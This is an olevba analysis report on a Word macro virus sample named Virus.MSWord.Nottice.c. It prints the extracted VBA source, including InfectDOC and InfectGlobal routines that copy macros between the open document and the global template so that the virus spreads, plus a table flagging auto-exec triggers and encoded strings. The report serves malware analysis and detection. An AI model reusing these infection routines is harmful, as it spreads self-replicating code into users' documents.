olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.c-37ce67ecb79acb42b0be4db2a85182f2c7f437de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.c-37ce67ecb79acb42b0be4db2a85182f2c7f437de - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.c-37ce67ecb79acb42b0be4db2a85182f2c7f437de - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Function VI()
Dim i
VI = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
                If WordBasic.[MacroName$](i, 1) = "WININIT" Then
                             VI = 1
        End If
    Next i
End If
End Function

Private Function VI2()
Dim i
VI2 = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
                If WordBasic.[MacroName$](i, 0) = "WININIT" Then
                             VI2 = 1
        End If
    Next i
End If
End Function

Private Sub InfectDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:WININIT", WordBasic.[FileName$]() + ":WININIT"
WordBasic.FileSaveAll 1, 1
End Sub

Private Sub InfectGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":WININIT", "Global:WININIT"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO WININIT.bas 
in file: Virus.MSWord.Nottice.c-37ce67ecb79acb42b0be4db2a85182f2c7f437de - OLE stream: 'Macros/VBA/WININIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

